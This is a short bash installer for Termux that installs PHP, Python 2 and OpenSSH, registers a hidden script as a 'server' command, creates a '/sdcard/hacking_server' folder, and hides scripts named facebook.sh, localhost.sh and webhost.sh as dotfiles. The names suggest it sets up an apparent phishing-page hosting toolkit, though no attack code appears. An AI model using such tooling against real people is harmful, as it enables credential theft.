#!/bin/bash
apt-get update
apt-get upgrade -y
apt-get install figlet -y
apt-get install python2 -y
apt-get install php -y
apt-get install openssh -y
cp ser.sh $HOME
mv ser.sh .ser.sh
chmod +x .ser.sh
rm -rf /data/data/com.termux/files/usr/bin/server
ln -s $HOME/.ser.sh /data/data/com.termux/files/usr/bin/server
rm -rf /sdcard/hacking_server
mkdir /sdcard/hacking_server
cd $HOME/server
chmod +x facebook.sh
chmod +x serphp.py
cd files
cp * /sdcard/hacking_server
cd $HOME/server
mv localhost.sh .localhost.sh
mv webhost.sh .webhost.sh
mv facebook.sh .facebook.sh
echo ""
echo ""
echo "just execute [server]"
